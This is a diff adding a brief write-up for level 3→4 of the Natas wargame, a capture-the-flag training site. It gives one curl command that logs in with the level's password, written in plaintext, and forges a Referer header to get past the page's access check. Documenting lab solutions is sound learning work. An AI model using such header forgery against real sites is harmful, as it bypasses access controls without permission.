@@ -1,0 +1,12 @@
+# Level 3 → 4
+
+## Goal:
+Using curl to pass a referer header, to gain access.
+
+## Method:
+Adding options to curl to add a referer header of the site it wants to be accessed by.
+
+## Command / Payload:
+curl -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
+
+## Notes:
